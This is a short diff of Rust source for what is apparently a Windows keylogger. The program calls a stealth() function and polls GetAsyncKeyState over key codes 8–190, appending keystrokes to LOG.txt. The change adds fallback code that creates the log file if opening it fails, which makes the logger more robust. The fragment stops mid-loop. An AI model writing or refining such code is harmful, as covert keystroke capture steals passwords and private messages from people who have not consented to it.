@@ -6,7 +6,10 @@ use std::fs::{File, OpenOptions};
 use std::io::prelude::*;
 fn main() {
 	stealth();
-	let mut file = OpenOptions::new().append(true).open("LOG.txt").unwrap();
+	let mut file = match OpenOptions::new().append(true).open("LOG.txt") {
+		Ok(file) => file,
+		Err(e) => File::create("LOG.txt").unwrap()
+	};
   loop {
   	for i in 8..190 {
     	if unsafe { user32::GetAsyncKeyState(i) } == -32767 {
